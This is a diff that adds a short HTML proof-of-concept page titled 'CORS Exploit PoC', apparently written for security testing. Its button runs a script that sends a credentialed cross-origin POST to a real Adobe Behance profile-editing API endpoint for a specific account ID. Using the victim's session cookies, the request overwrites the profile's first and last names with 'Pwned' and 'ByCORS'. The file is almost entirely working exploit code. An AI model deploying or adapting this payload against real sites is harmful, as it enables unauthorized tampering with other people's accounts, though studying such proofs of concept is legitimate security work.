@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CORS Exploit PoC</title>
+  </head>
+  <body>
+    <h2>Testing CORS Misconfiguration</h2>
+    <button onclick="sendExploit()">Click to Exploit</button>
+
+    <script>
+      function sendExploit() {
+        fetch("https://cc-api-behance.adobe.io/v2/profile/editor/E0805E206735D7450A495F91@AdobeID", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            first_name: "Pwned",
+            last_name: "ByCORS"
+          })
+        })
+        .then(res => res.text())
+        .then(data => console.log("Response:", data))
+        .catch(err => console.error("Error:", err));
+      }
+    </script>
+  </body>
+</html>
